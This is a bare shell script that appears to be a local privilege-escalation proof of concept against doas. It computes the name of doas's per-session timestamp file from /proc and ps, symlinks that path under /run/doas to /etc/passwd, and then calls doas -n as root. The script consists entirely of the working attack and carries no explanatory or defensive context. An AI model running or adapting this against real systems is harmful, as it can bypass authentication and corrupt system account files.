#!/bin/sh
set -eu
stat_line=$(cat /proc/$$/stat)
rest=${stat_line#*) }
set -- $rest
ttynr=$5
starttime=$20
sid=$(ps -o sid= -p $$ | tr -d ' ')
path="/run/doas/$$-$sid-$ttynr-$starttime-$(id -u)"
mkdir -p /run/doas
chmod 0700 /run/doas
ln -sf /etc/passwd "$path"
exec doas -n -u root /usr/bin/id -u
